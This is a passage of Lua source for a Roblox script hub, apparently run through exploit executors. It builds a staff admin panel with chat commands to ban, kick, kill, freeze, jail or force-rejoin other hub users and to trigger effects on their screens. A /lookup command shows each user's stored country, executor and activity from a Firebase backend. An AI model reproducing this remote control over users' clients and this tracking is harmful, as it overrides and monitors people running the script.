		Loader:Notify({ Title = "Message", Content = "Message sent to " .. name .. ".", Type = "Success", Duration = 3 })
	end

	local function sendMsg(text)
		text = clean(text)
		if text == "" then
			error("Write the message first.")
		end
		guard()
		post({ c = "msg", text = text })
		Loader:Notify({ Title = "Message", Content = "Message sent to everyone.", Type = "Success", Duration = 3 })
	end

	local function startPoll(text, seconds)
		text = clean(text)
		if text == "" then
			error("Write the question first.")
		end
		guard()
		seconds = math.clamp(math.floor(tonumber(seconds) or 30), 10, 120)
		local id = LocalPlayer.UserId .. "-" .. math.random(100000, 999999) .. "-" .. os.time()
		myPolls[id] = { yes = 0, no = 0, voted = {} }
		post({ c = "poll", n = id, text = text, dur = seconds })
		Loader:Notify({ Title = "Poll", Content = "Poll started for " .. seconds .. "s.", Type = "Success", Duration = 3 })
		task.delay(seconds + 3, function()
			local poll = myPolls[id]
			if poll and not Loader._destroyed then
				Loader:Notify({
					Title = "Poll result",
					Content = text .. "  |  Yes: " .. poll.yes .. "  |  No: " .. poll.no,
					Type = "Success",
					Duration = 12,
					Force = true,
				})
			end
		end)
	end

	local function showList(kind)
		if kind == "vip" then
			pcall(refreshVip)
		else
			pcall(refreshModeration)
		end
		local set = (kind == "vip" and Library.VipSet) or (kind == "mute" and Library.MutedSet) or Library.BannedSet
		local names = {}
		for name in pairs(set) do
			table.insert(names, name)
		end
		table.sort(names)
		local shown = {}
		for i = 1, math.min(#names, 25) do
			shown[i] = names[i]
		end
		local title = (kind == "vip" and "VIP list") or (kind == "mute" and "Muted list") or "Banned list"
		Loader:Notify({
			Title = title .. " (" .. #names .. ")",
			Content = #names == 0 and "Nobody yet." or (table.concat(shown, ", ") .. (#names > 25 and " ..." or "")),
			Type = "Info",
			Duration = 12,
			Force = true,
		})
	end

	local function bringUser(user)
		local name = validUser(user)
		staffGuard(name)
		local char = LocalPlayer.Character
		local root = char and char:FindFirstChild("HumanoidRootPart")
		if not root then
			error("Your character is not loaded.")
		end
		if game.JobId == "" then
			error("No server ID available here.")
		end
		guard()
		local pos = root.Position
		post({ c = "bring", target = name, job = game.JobId, x = pos.X, y = pos.Y, z = pos.Z })
		Loader:Notify({ Title = "Bring", Content = "Bringing " .. name .. " to you (same server only).", Type = "Success", Duration = 3 })
	end

	local function clearChat()
		guard()
		post({ c = "clearchat" })
		if Library.ChatLog then
			Library.ChatLog:Clear()
		end
		Loader:Notify({ Title = "Chat", Content = "Chat cleared for everyone.", Type = "Success", Duration = 3 })
	end

	local function setSlowmode(seconds)
		seconds = math.clamp(math.floor(tonumber(seconds) or 0), 0, 60)
		guard()
		post({ c = "slowmode", sec = seconds })
		Library.ChatCooldown = seconds > 0 and seconds or nil
		Loader:Notify({ Title = "Chat", Content = seconds > 0 and ("Slow mode: " .. seconds .. "s.") or "Slow mode off.", Type = "Success", Duration = 3 })
	end

	local extraCommands = {} -- more commands, registered further down (party, fx, stats ...)

	-- OWNER / ADMIN nametag ON / OFF (for every hub user, saved in Firebase /tagoff)
	local function setTagVisible(rankName, visible)
		rankName = string.upper(tostring(rankName or ""))
		if rankName ~= "OWNER" and rankName ~= "ADMIN" then
			error("Use: /tag owner|admin on|off")
		end
		guard()
		Library.TagHidden[rankName] = (not visible) or nil
		if Library.RefreshTags then
			Library.RefreshTags()
		end
		post({ c = "tagvis", rank = rankName, hidden = not visible })
		task.spawn(function()
			local path = "/tagoff/" .. string.lower(rankName) .. ".json"
			local ok
			if visible then
				ok = fb("DELETE", path)
			else
				ok = fb("PUT", path, { by = LocalPlayer.Name, t = os.time() })
			end
			Library.TagPersist = ok and true or false
		end)
		Loader:Notify({ Title = "Tag", Content = rankName .. " tag " .. (visible and "ON" or "OFF") .. " for everyone.", Type = "Success", Duration = 3 })
	end

	extraCommands.tag = function(rest)
		local who, state = tostring(rest or ""):match("^(%S+)%s+(%S+)$")
		state = state and string.lower(state)
		if not who or (state ~= "on" and state ~= "off") then
			error("Use: /tag owner|admin on|off")
		end
		setTagVisible(who, state == "on")
	end

	local function runCommand(text)
		text = clean(text)
		local cmd, rest = text:match("^/(%S+)%s*(.*)$")
		if not cmd then
			error("Commands start with /  (example: /give vip username)")
		end
		cmd = string.lower(cmd)
		if cmd == "give" or cmd == "remove" then
			local what, user, daysText = rest:match("^(%S+)%s+(%S+)%s*(%S*)$")
			if not what or string.lower(what) ~= "vip" then
				error("Use: /" .. cmd .. " vip <username> [days]")
			end
			if cmd == "give" then
				local days = tonumber(daysText)
				if days then
					days = math.clamp(math.floor(days), 1, 3650)
				end
				giveVip(user, days)
			else
				removeVip(user)
			end
		elseif cmd == "announce" then
			sendAnnounce(rest)
		elseif cmd == "giveaway" then
			startGiveaway(tonumber(rest) or 60)
		elseif cmd == "call" then
			if rest == "" then
				error("Use: /call <username|all>")
			end
			sendCall(rest == "all" and "all" or validUser(rest), "")
		elseif cmd == "mute" then
			muteUser(rest, true)
		elseif cmd == "unmute" then
			muteUser(rest, false)
		elseif cmd == "ban" then
			banUser(rest, true)
		elseif cmd == "unban" then
			banUser(rest, false)
		elseif cmd == "warn" then
			local user, warnText = rest:match("^(%S+)%s+(.+)$")
			if not user then
				error("Use: /warn <username> <message>")
			end
			warnUser(user, warnText)
		elseif cmd == "bring" then
			bringUser(rest)
		elseif cmd == "clearchat" then
			clearChat()
		elseif cmd == "slowmode" then
			setSlowmode(tonumber(rest) or 0)
		elseif extraCommands[cmd] then
			extraCommands[cmd](rest)
		else
			error("Unknown command. Type /cmds to see all commands.")
		end
	end

	Library.StaffCommandRunner = runCommand -- lets the Global Chat box run commands too

	-- Separate "ADMIN PANEL" window (opens together with the hub, only for OWNER / ADMIN) --------
	local adminWindow = Library:CreateWindow({
		Name = "ADMIN PANEL",
		Theme = Config:Get("themeV2", "Purple"),
		Size = UDim2.fromOffset(560, 400),
		ShowSupportTab = false,
		ToggleKey = "RightControl", -- RightShift stays the hub's key; RightControl hides / shows the panel
	})
	adminWindow.Gui.DisplayOrder = 1000
	adminWindow.Main.Position = UDim2.new(0.5, 40, 0.5, 30)
	adminWindow.Floating.Position = UDim2.fromOffset(20, 170)
	Loader:AddCleanup(function()
		adminWindow:Destroy()
	end)

	local adminTabs = {
		Commands = adminWindow:CreateTab("Commands"),
		Announce = adminWindow:CreateTab("Announce"),
		Players = adminWindow:CreateTab("Players"),
		Fun = adminWindow:CreateTab("Fun"),
		Events = adminWindow:CreateTab("Events"),
		Stats = adminWindow:CreateTab("Stats"),
	}
	local adminTab = adminTabs.Commands
	adminTab:CreateParagraph({ Text = "Staff only. Everything you send is shown to every VÆLOR HUB user. RightControl = hide / show this panel." })

	adminTab:CreateSection({ Text = "Command Line" })
	adminTab:CreateParagraph({
		Text = "/give vip <user> [days]   /remove vip <user>\n/announce <text>   /giveaway <seconds>\n/call <user|all>\n/mute /unmute /ban /unban /kick <user>\n/warn <user> <text>   /bring <user>\n/clearchat   /slowmode <sec>\n/party <style>   /fireworks   /disco   /mega\n/countdown [sec] [text]   /bigtext <text>\n/coin   /dice [d6|d20|d100]   /emoji <emoji>\n/freeze <user> [sec 3-100]   /unfreeze   /respawn   /rejoin\n/kill <user>   /sit <user>   /ragdoll <user> [sec]   /unragdoll\n/jail <user> [sec 10-100]   /unjail <user>\n/dm <user> <text>   /msg <text>   /poll <question>\n/viplist   /mutelist   /banlist\n/tag owner|admin on|off\n/stats   /lookup <user>   /cmds",
		TextSize = 11,
	})
	local cmdBox = adminTab:CreateTextbox({ Name = "Command", Placeholder = "/give vip username" })
	adminTab:CreateButton({
		Name = "Run Command",
		ButtonText = "Run",
		Callback = function()
			runCommand(cmdBox:GetText())
			cmdBox:SetText("")
		end,
	})

	adminTab:CreateSection({ Text = "Nametags (OWNER / ADMIN)" })
	local tagUiReady = false
	task.delay(1, function()
		tagUiReady = true
	end)
	adminTab:CreateToggle({
		Name = "OWNER Tag",
		Description = "ON = everyone sees the OWNER nametag. OFF = hidden for all hub users",
		Default = not Library.TagHidden.OWNER,
		Callback = function(on)
			if tagUiReady then
				setTagVisible("OWNER", on)
			end
		end,
	})
	adminTab:CreateToggle({
		Name = "ADMIN Tag",
		Description = "ON = everyone sees the ADMIN nametag. OFF = hidden for all hub users",
		Default = not Library.TagHidden.ADMIN,
		Callback = function(on)
			if tagUiReady then
				setTagVisible("ADMIN", on)
			end
		end,
	})

	-- Roblox chat: every Command Line command (/give vip, /ban, /announce ...) also works when typed in the normal Roblox chat
	-- (this whole block is staff only because of the isStaff check above)
	do
		-- every command of the Command Line also works from the Roblox chat
		local CHAT_CMDS = {
			give = true, remove = true, announce = true, giveaway = true, call = true,
			mute = true, unmute = true, ban = true, unban = true, warn = true,
			bring = true, clearchat = true, slowmode = true,
		}
		local lastChatCmd, lastChatCmdAt = "", 0
		local function handleRobloxChat(text)
			text = tostring(text or "")
			local cmd, rest = text:match("^/(%S+)%s*(.*)$")
			if not cmd or not (CHAT_CMDS[string.lower(cmd)] or extraCommands[string.lower(cmd)]) then
				return
			end
			cmd = string.lower(cmd)
			if cmd == "give" or cmd == "remove" then
				local what = rest:match("^(%S+)")
				if not what or string.lower(what) ~= "vip" then
					return
				end
			end
			-- both chat events can fire for the same message: only run it once
			if text == lastChatCmd and os.clock() - lastChatCmdAt < 1.5 then
				return
			end
			lastChatCmd, lastChatCmdAt = text, os.clock()
			task.spawn(function()
				local ok, err = pcall(runCommand, text)
				if not ok then
					Loader:Notify({
						Title = "Admin",
						Content = (tostring(err):gsub("^.-:%d+:%s*", "")),
						Type = "Error",
						Duration = 4,
						Force = true,
					})
				end
			end)
		end

		Loader:AddCleanup(LocalPlayer.Chatted:Connect(handleRobloxChat))
		pcall(function()
			local tcs = game:GetService("TextChatService")
			Loader:AddCleanup(tcs.SendingMessage:Connect(function(message)
				handleRobloxChat(message.Text)
			end))
		end)
	end

	adminTab = adminTabs.Announce
	adminTab:CreateSection({ Text = "Announcement" })
	local annBox = adminTab:CreateTextbox({ Name = "Message", Placeholder = "Announcement text..." })
	local annTime = adminTab:CreateSlider({
		Name = "Show Time",
		Min = 5,
		Max = 60,
		Step = 5,
		Default = 10,
		Suffix = "s",
	})
	adminTab:CreateButton({
		Name = "Send Announcement",
		Description = "Banner popup for every hub user",
		ButtonText = "Send",
		Callback = function()
			sendAnnounce(annBox:GetText(), annTime.Value)
			annBox:SetText("")
		end,
	})

	adminTab = adminTabs.Players
	adminTab:CreateSection({ Text = "Target Player" })
	local targetBox = adminTab:CreateTextbox({ Name = "Username", Placeholder = "Roblox username" })

	adminTab:CreateSection({ Text = "VIP Title" })
	local vipDuration = adminTab:CreateDropdown({
		Name = "VIP Duration",
		Options = { "Permanent", "7 days", "30 days" },
		Default = "Permanent",
	})
	adminTab:CreateButton({
		Name = "Give VIP",
		Description = "Gives VIP to the username above (see duration)",
		ButtonText = "Give",
		Callback = function()
			local days = ({ ["7 days"] = 7, ["30 days"] = 30 })[vipDuration.Value]
			giveVip(targetBox:GetText(), days)
		end,
	})
	adminTab:CreateButton({
		Name = "Remove VIP",
		Description = "Takes the VIP title away",
		ButtonText = "Remove",
		Callback = function()
			removeVip(targetBox:GetText())
		end,
	})

	adminTab:CreateSection({ Text = "Moderation" })
	local warnBox = adminTab:CreateTextbox({ Name = "Warn text", Placeholder = "Warning message..." })
	adminTab:CreateButton({
		Name = "Warn Player",
		Description = "Shows the warning to the username above",
		ButtonText = "Warn",
		Callback = function()
			warnUser(targetBox:GetText(), warnBox:GetText())
		end,
	})
	adminTab:CreateButton({
		Name = "Kick",
		Description = "Kicks the username above out of the game (hub users only)",
		ButtonText = "Kick",
		Callback = function()
			kickUser(targetBox:GetText())
		end,
	})
	local effectTime = adminTab:CreateSlider({
		Name = "Effect Time",
		Min = 10,
		Max = 100,
		Step = 10,
		Default = 10,
		Suffix = "s",
	})
	adminTab:CreateButton({
		Name = "Freeze",
		Description = "Holds the username above in place (see Effect Time)",
		ButtonText = "Freeze",
		Callback = function()
			freezeUser(targetBox:GetText(), effectTime.Value)
		end,
	})
	adminTab:CreateButton({
		Name = "Unfreeze",
		ButtonText = "Unfreeze",
		Callback = function()
			targetCmd("unfreeze", targetBox:GetText(), nil, "Unfroze")
		end,
	})
	adminTab:CreateButton({
		Name = "Respawn",
		Description = "Resets the username above's character",
		ButtonText = "Respawn",
		Callback = function()
			targetCmd("respawn", targetBox:GetText(), nil, "Respawned")
		end,
	})
	adminTab:CreateButton({
		Name = "Force Rejoin",
		Description = "Makes the username above rejoin the game",
		ButtonText = "Rejoin",
		Callback = function()
			targetCmd("rejoin", targetBox:GetText(), nil, "Rejoin sent to")
		end,
	})
	adminTab:CreateButton({
		Name = "Backrooms",
		Description = "Sends the username above to the Backrooms (see Effect Time), then returns them",
		ButtonText = "Backrooms",
		Callback = function()
			backroomsUser(targetBox:GetText(), effectTime.Value)
		end,
	})
	adminTab:CreateButton({
		Name = "Bring Back (Backrooms)",
		Description = "Takes the username above out of the Backrooms right away",
		ButtonText = "Bring Back",
		Callback = function()
			targetCmd("unbackrooms", targetBox:GetText(), nil, "Brought back from Backrooms:")
		end,
	})
	adminTab:CreateButton({
		Name = "Kill",
		Description = "Kills the username above's character",
		ButtonText = "Kill",
		Callback = function()
			targetCmd("kill", targetBox:GetText(), nil, "Killed")
		end,
	})
	adminTab:CreateButton({
		Name = "Ragdoll",
		Description = "Makes the username above go limp (see Effect Time)",
		ButtonText = "Ragdoll",
		Callback = function()
			ragdollUser(targetBox:GetText(), effectTime.Value)
		end,
	})
	adminTab:CreateButton({
		Name = "Un-ragdoll",
		ButtonText = "Stop",
		Callback = function()
			targetCmd("unragdoll", targetBox:GetText(), nil, "Un-ragdolled")
		end,
	})
	adminTab:CreateButton({
		Name = "Jail",
		Description = "Locks the username above in a cage (see Effect Time)",
		ButtonText = "Jail",
		Callback = function()
			jailUser(targetBox:GetText(), effectTime.Value)
		end,
	})
	adminTab:CreateButton({
		Name = "Unjail",
		ButtonText = "Free",
		Callback = function()
			unjailUser(targetBox:GetText())
		end,
	})
	adminTab:CreateButton({
		Name = "Sit In Front Of Me",
		Description = "Brings the username above in front of you and sits them (same server)",
		ButtonText = "Sit",
		Callback = function()
			sitUser(targetBox:GetText())
		end,
	})
	adminTab:CreateButton({
		Name = "Mute",
		Description = "Their Global Chat messages are hidden for everyone",
		ButtonText = "Mute",
		Callback = function()
			muteUser(targetBox:GetText(), true)
		end,
	})
	adminTab:CreateButton({
		Name = "Unmute",
		ButtonText = "Unmute",
		Callback = function()
			muteUser(targetBox:GetText(), false)
		end,
	})
	adminTab:CreateButton({
		Name = "Ban from Hub",
		Description = "The hub closes for them every time they run it",
		ButtonText = "Ban",
		Callback = function()
			banUser(targetBox:GetText(), true)
		end,
	})
	adminTab:CreateButton({
		Name = "Unban",
		ButtonText = "Unban",
		Callback = function()
			banUser(targetBox:GetText(), false)
		end,
	})
	adminTab:CreateButton({
		Name = "Bring",
		Description = "Teleports the username above to you (same server only)",
		ButtonText = "Bring",
		Callback = function()
			bringUser(targetBox:GetText())
		end,
	})

	adminTab:CreateSection({ Text = "Effects (shown to the target)" })
	adminTab:CreateParagraph({ Text = "Uses the username above and the Effect Time slider. Works on staff too.", TextSize = 11 })
	adminTab:CreateButton({
		Name = "Gojo: Infinite Void",
		Description = "Domain Expansion on the target's screen",
		ButtonText = "Cast",
		Callback = function() fxUser("gojo", targetBox:GetText(), effectTime.Value, "Infinite Void on") end,
	})
	adminTab:CreateButton({
		Name = "Hollow Purple",
		Description = "Blue + Red merge into Purple and fire at the target",
		ButtonText = "Fire",
		Callback = function() fxUser("purple", targetBox:GetText(), effectTime.Value, "Hollow Purple on") end,
	})
	adminTab:CreateButton({
		Name = "Sukuna: Malevolent Shrine",
		Description = "Shrine rises around the target with endless slashes",
		ButtonText = "Cast",
		Callback = function() fxUser("shrine", targetBox:GetText(), effectTime.Value, "Malevolent Shrine on") end,
	})
	adminTab:CreateButton({
		Name = "Shadow Clones (of me)",
		Description = "Clones of YOUR avatar circle around the target (see Effect Time)",
		ButtonText = "Summon",
		Callback = function() fxUser("clones", targetBox:GetText(), effectTime.Value, "My clones around", { count = 6 }) end,
	})
	adminTab:CreateButton({
		Name = "Giant",
		Description = "Target becomes huge (R15 only, see Effect Time)",
		ButtonText = "Giant",
		Callback = function() fxUser("giant", targetBox:GetText(), effectTime.Value, "Giant:") end,
	})
	adminTab:CreateButton({
		Name = "Tiny",
		Description = "Target becomes tiny (R15 only, see Effect Time)",
		ButtonText = "Tiny",
		Callback = function() fxUser("tiny", targetBox:GetText(), effectTime.Value, "Tiny:") end,
	})
	adminTab:CreateButton({
		Name = "Heaven",
		Description = "Golden sky, halo and falling light for the target",
		ButtonText = "Heaven",
		Callback = function() fxUser("heaven", targetBox:GetText(), effectTime.Value, "Heaven on") end,
	})
	adminTab:CreateButton({
		Name = "Blackout",
		Description = "Everything goes dark for the target",
		ButtonText = "Blackout",
		Callback = function() fxUser("blackout", targetBox:GetText(), effectTime.Value, "Blackout on") end,
	})
	adminTab:CreateButton({
		Name = "Thunder Strike",
		Description = "Sky goes dark, lightning hits the target and kills their character",
		ButtonText = "Strike",
		Callback = function() fxUser("thunder", targetBox:GetText(), effectTime.Value, "Thunder strike on") end,
	})
	adminTab:CreateButton({
		Name = "Stop Effects",
		Description = "Ends clones / size / heaven / blackout on the target right away",
		ButtonText = "Stop",
		Callback = function() fxUser("stop", targetBox:GetText(), 5, "Effects stopped on") end,
	})

	adminTab:CreateSection({ Text = "Effects: Everyone In This Server" })
	adminTab:CreateButton({
		Name = "Thunder Strike (Everyone)",
		Description = "Dark sky + lightning kills every hub user in your server (staff included, except you)",
		ButtonText = "Strike All",
		Callback = function() fxAll("thunder", effectTime.Value, "Thunder strike sent") end,
	})
	adminTab:CreateButton({
		Name = "Blackout (Everyone)",
		Description = "Everything goes dark for every hub user in your server (see Effect Time)",
		ButtonText = "Dark",
		Callback = function() fxAll("blackout", effectTime.Value, "Blackout sent") end,
	})
	adminTab:CreateButton({
		Name = "Heaven (Everyone)",
		Description = "Golden sky for every hub user in your server (see Effect Time)",
		ButtonText = "Heaven",
		Callback = function() fxAll("heaven", effectTime.Value, "Heaven sent") end,
	})
	adminTab:CreateButton({
		Name = "Stop Effects (Everyone)",
		ButtonText = "Stop",
		Callback = function() fxAll("stop", 5, "Effects stopped") end,
	})

	adminTab:CreateSection({ Text = "Chat Control" })
	adminTab:CreateButton({
		Name = "Clear Chat",
		Description = "Empties the Global Chat for everyone",
		ButtonText = "Clear",
		Callback = clearChat,
	})
	local slowSlider = adminTab:CreateSlider({
		Name = "Slow Mode",
		Min = 0,
		Max = 30,
		Step = 1,
		Default = 0,
		Suffix = "s",
	})
	adminTab:CreateButton({
		Name = "Apply Slow Mode",
		Description = "0 = off",
		ButtonText = "Apply",
		Callback = function()
			setSlowmode(slowSlider.Value)
		end,
	})

	adminTab = adminTabs.Fun
	adminTab:CreateSection({ Text = "Fun" })
	do
		local partyStyle = adminTab:CreateDropdown({
			Name = "Party Style",
			Options = { "Confetti", "Hearts", "Snow", "Stars", "Fire" },
			Default = "Confetti",
		})
		adminTab:CreateButton({
			Name = "Start Party",
			Description = "Emoji rain on every hub user's screen",
			ButtonText = "Party!",
			Callback = function()
				local style = partyStyle.Value
				if not Library.PartyStyles[style] then
					error("Pick a style first.")
				end
				guard()
				post({ c = "party", style = style })
				Library.ShowParty(style, nil)
				Loader:Notify({ Title = "Admin", Content = style .. " party sent to everyone.", Type = "Success", Duration = 3 })
			end,
		})

		-- /party <style>
		extraCommands.party = function(rest)
			local want = string.lower(clean(rest))
			local style
			for name in pairs(Library.PartyStyles) do
				if name ~= "Custom" and string.lower(name) == want then
					style = name
				end
			end
			if not style then
				error("Use: /party confetti | hearts | snow | stars | fire | disco")
			end
			guard()
			post({ c = "party", style = style })
			Library.ShowParty(style, nil)
			Loader:Notify({ Title = "Admin", Content = style .. " party sent to everyone.", Type = "Success", Duration = 3 })
		end
	end

	adminTab:CreateSection({ Text = "More Fun" })
	do
		local function fire(kind, params, what)
			guard()
			params = params or {}
			params.c = "fx"
			params.kind = kind
			post(params)
			Library.RunFx(kind, params, nil)
			Loader:Notify({ Title = "Admin", Content = what .. " sent to everyone.", Type = "Success", Duration = 3 })
		end

		adminTab:CreateButton({
			Name = "Fireworks",
			Description = "Colourful fireworks on every screen",
			ButtonText = "Launch",
			Callback = function()
				fire("fireworks", nil, "Fireworks")
			end,
		})
		adminTab:CreateButton({
			Name = "Disco Mode",
			Description = "Soft colour wash + disco emojis (no strobe)",
			ButtonText = "Disco",
			Callback = function()
				fire("disco", nil, "Disco Mode")
			end,
		})
		adminTab:CreateButton({
			Name = "MEGA Party",
			Description = "Fireworks + confetti together",
			ButtonText = "MEGA",
			Callback = function()
				fire("mega", nil, "MEGA Party")
			end,
		})

		local cdSecs = adminTab:CreateSlider({ Name = "Countdown From", Min = 3, Max = 10, Step = 1, Default = 5, Suffix = "s" })
		local cdText = adminTab:CreateTextbox({ Name = "Final Text", Placeholder = "GO! (optional)" })
		adminTab:CreateButton({
			Name = "Countdown",
			Description = "Big 3-2-1 countdown for events / giveaways",
			ButtonText = "Start",
			Callback = function()
				fire("countdown", { secs = cdSecs.Value, text = Library.CutText(clean(cdText:GetText()), 20) }, "Countdown")
			end,
		})

		local bigBox = adminTab:CreateTextbox({ Name = "Big Text", Placeholder = "Text for the middle of every screen..." })
		local bigTime = adminTab:CreateSlider({ Name = "Big Text Time", Min = 3, Max = 15, Step = 1, Default = 6, Suffix = "s" })
		adminTab:CreateButton({
			Name = "Show Big Text",
			Description = "Rainbow text pops up in the centre",
			ButtonText = "Show",
			Callback = function()
				local text = Library.CutText(clean(bigBox:GetText()), 60)
				if text == "" then
					error("Write the text first.")
				end
				fire("bigtext", { text = text, dur = bigTime.Value }, "Big Text")
				bigBox:SetText("")
			end,
		})

		adminTab:CreateButton({
			Name = "Coin Flip",
			Description = "Everyone sees the same Heads / Tails result",
			ButtonText = "Flip",
			Callback = function()
				fire("coin", { val = math.random(1, 2) == 1 and "Heads" or "Tails" }, "Coin Flip")
			end,
		})

		local diceType = adminTab:CreateDropdown({ Name = "Dice", Options = { "D6", "D20", "D100" }, Default = "D6" })
		adminTab:CreateButton({
			Name = "Roll Dice",
			Description = "Everyone sees the same roll",
			ButtonText = "Roll",
			Callback = function()
				local sides = ({ D6 = 6, D20 = 20, D100 = 100 })[diceType.Value] or 6
				fire("dice", { sides = sides, val = math.random(1, sides) }, "Dice Roll")
			end,
		})

		local emojiBox = adminTab:CreateTextbox({ Name = "Custom Emoji", Placeholder = "e.g. 🐸 (1-3 emojis)" })
		adminTab:CreateButton({
			Name = "Emoji Rain",
			Description = "Rains your own emoji on every screen",
			ButtonText = "Rain",
			Callback = function()
				local e = Library.CutText(clean(emojiBox:GetText()), 3)
				if e == "" then
					error("Type an emoji first.")
				end
				fire("emoji", { text = e }, "Emoji Rain")
			end,
		})

		-- Command line versions of the buttons above
		extraCommands.fireworks = function()
			fire("fireworks", nil, "Fireworks")
		end
		extraCommands.disco = function()
			fire("disco", nil, "Disco Mode")
		end
		extraCommands.mega = function()
			fire("mega", nil, "MEGA Party")
		end
		extraCommands.countdown = function(rest)
			local secsText, finalText = clean(rest):match("^(%d+)%s*(.*)$")
			local secs = math.clamp(tonumber(secsText) or 5, 3, 10)
			if not secsText then
				finalText = clean(rest)
			end
			fire("countdown", { secs = secs, text = Library.CutText(finalText or "", 20) }, "Countdown")
		end
		extraCommands.bigtext = function(rest)
			local text = Library.CutText(clean(rest), 60)
			if text == "" then
				error("Use: /bigtext <text>")
			end
			fire("bigtext", { text = text, dur = 6 }, "Big Text")
		end
		extraCommands.coin = function()
			fire("coin", { val = math.random(1, 2) == 1 and "Heads" or "Tails" }, "Coin Flip")
		end
		extraCommands.dice = function(rest)
			local sides = ({ d6 = 6, d20 = 20, d100 = 100, ["6"] = 6, ["20"] = 20, ["100"] = 100 })[string.lower(clean(rest))] or 6
			fire("dice", { sides = sides, val = math.random(1, sides) }, "Dice Roll")
		end
		extraCommands.emoji = function(rest)
			local e = Library.CutText(clean(rest), 3)
			if e == "" then
				error("Use: /emoji <emoji>")
			end
			fire("emoji", { text = e }, "Emoji Rain")
		end
	end

	adminTab = adminTabs.Events
	adminTab:CreateSection({ Text = "Giveaway" })
	local giveawayTime = adminTab:CreateSlider({
		Name = "Duration",
		Min = 15,
		Max = 300,
		Step = 15,
		Default = 60,
		Suffix = "s",
	})
	adminTab:CreateButton({
		Name = "Start Giveaway",
		Description = "Popup for everyone, joiners get VIP",
		ButtonText = "Start",
		Callback = function()
			startGiveaway(giveawayTime.Value)
		end,
	})
	joinStat = adminTab:CreateStat({ Name = "Joined", Value = "0" })

	adminTab:CreateSection({ Text = "Poll" })
	local pollBox = adminTab:CreateTextbox({ Name = "Question", Placeholder = "Yes / No question..." })
	adminTab:CreateButton({
		Name = "Start Poll (30s)",
		Description = "Everyone votes Yes / No, you get the result",
		ButtonText = "Start",
		Callback = function()
			startPoll(pollBox:GetText(), 30)
			pollBox:SetText("")
		end,
	})

	adminTab:CreateSection({ Text = "Call Users" })
	local noteBox = adminTab:CreateTextbox({ Name = "Note", Placeholder = "Optional note..." })
	adminTab:CreateButton({
		Name = "Call Player",
		Description = "Asks the player above to join your server",
		ButtonText = "Call",
		Callback = function()
			sendCall(validUser(targetBox:GetText()), noteBox:GetText())
		end,
	})
	adminTab:CreateButton({
		Name = "Call All",
		Description = "Asks every hub user to join your server",
		ButtonText = "Call All",
		Callback = function()
			sendCall("all", noteBox:GetText())
		end,
	})

	adminTab:CreateSection({ Text = "Call Responses" })
	acceptedStat = adminTab:CreateStat({ Name = "Accepted", Value = "0" })
	declinedStat = adminTab:CreateStat({ Name = "Declined", Value = "0" })

	-- Hub stats ---------------------------------------------------------------------------------
	local COUNTRY_NAMES = {
		IN = "India", US = "United States", PK = "Pakistan", BD = "Bangladesh", ID = "Indonesia", PH = "Philippines",
		BR = "Brazil", MX = "Mexico", GB = "United Kingdom", CA = "Canada", AU = "Australia", DE = "Germany",
		FR = "France", ES = "Spain", IT = "Italy", RU = "Russia", TR = "Turkey", SA = "Saudi Arabia",
		AE = "UAE", EG = "Egypt", NG = "Nigeria", ZA = "South Africa", MY = "Malaysia", TH = "Thailand",
		VN = "Vietnam", JP = "Japan", KR = "South Korea", CN = "China", AR = "Argentina", CO = "Colombia",
		CL = "Chile", PE = "Peru", PL = "Poland", NL = "Netherlands", SE = "Sweden", NP = "Nepal", LK = "Sri Lanka",
	}

	local function fmtCountry(code)
		code = tostring(code or "")
		if code == "" or code == "?" or code == "nil" then
			return "Unknown"
		end
		local name = COUNTRY_NAMES[code]
		return name and (name .. " (" .. code .. ")") or code
	end

	local function fmtDate(t)
		t = tonumber(t)
		return t and os.date("%Y-%m-%d %H:%M", t) or "-"
	end

	local function loadUsers()
		local ok, res = fb("GET", "/users.json")
		if not ok or type(res.Body) ~= "string" then
			error("Could not load stats (check your Firebase rules for /users).")
		end
		local okJson, data = pcall(InfoHttp.JSONDecode, InfoHttp, res.Body)
		if not okJson or type(data) ~= "table" then
			return {}
		end
		return data
	end

	local function topOf(counts)
		local bestKey, bestCount = "-", 0
		for key, count in pairs(counts) do
			if count > bestCount then
				bestKey, bestCount = key, count
			end
		end
		return bestKey == "-" and "-" or (bestKey .. " (" .. bestCount .. ")")
	end

	-- /stats, /lookup <user>, /cmds ---------------------------------------------------------------
	extraCommands.stats = function()
		local data = loadUsers()
		local now = os.time()
		local total, online, today, execs = 0, 0, 0, 0
		for _, u in pairs(data) do
			if type(u) == "table" then
				total += 1
				local last = tonumber(u.last) or 0
				if u.state == "online" and now - last < 600 then
					online += 1
				end
				if now - last < 86400 then
					today += 1
				end
				execs += tonumber(u.execs) or 0
			end
		end
		Loader:Notify({
			Title = "Hub Stats",
			Content = "Total: " .. total .. "  |  Online: " .. online .. "  |  24h: " .. today .. "  |  Executions: " .. execs,
			Type = "Info",
			Duration = 8,
			Force = true,
		})
	end

	extraCommands.lookup = function(rest)
		local query = validUser(rest)
		local found
		for _, u in pairs(loadUsers()) do
			if type(u) == "table" and string.lower(tostring(u.name or "")) == query then
				found = u
				break
		end
		end
		if not found then
			error("No data for " .. query .. ".")
		end
		local online = found.state == "online" and os.time() - (tonumber(found.last) or 0) < 600
		Loader:Notify({
			Title = tostring(found.name) .. (online and " (Online)" or " (Offline)"),
			Content = "Game: " .. tostring(found.gameName or found.gameId or "?")
				.. "  |  Executor: " .. tostring(found.executor or "?")
				.. "  |  Executions: " .. tostring(found.execs or 0)
				.. "  |  Country: " .. fmtCountry(found.country)
				.. "  |  Last seen: " .. fmtDate(found.last),
			Type = "Info",
			Duration = 10,
			Force = true,
		})
	end

	extraCommands.kick = function(rest)
		kickUser(rest)
	end
	extraCommands.freeze = function(rest)
		local user, sec = rest:match("^(%S+)%s*(%S*)$")
		freezeUser(user or "", sec)
	end
	extraCommands.unfreeze = function(rest)
		targetCmd("unfreeze", rest, nil, "Unfroze")
	end
	extraCommands.respawn = function(rest)
		targetCmd("respawn", rest, nil, "Respawned")
	end
	extraCommands.rejoin = function(rest)
		targetCmd("rejoin", rest, nil, "Rejoin sent to")
	end
	extraCommands.jail = function(rest)
		local user, sec = rest:match("^(%S+)%s*(%S*)$")
		jailUser(user or "", sec)
	end
	extraCommands.unjail = function(rest)
		unjailUser(rest)
	end
	extraCommands.kill = function(rest)
		targetCmd("kill", rest, nil, "Killed")
	end
	extraCommands.backrooms = function(rest)
		local user, sec = rest:match("^(%S+)%s*(%S*)$")
		backroomsUser(user or "", sec)
	end
	extraCommands.unbackrooms = function(rest)
		targetCmd("unbackrooms", rest, nil, "Brought back from Backrooms:")
	end
	extraCommands.sit = function(rest)
		sitUser(rest)
	end
	extraCommands.ragdoll = function(rest)
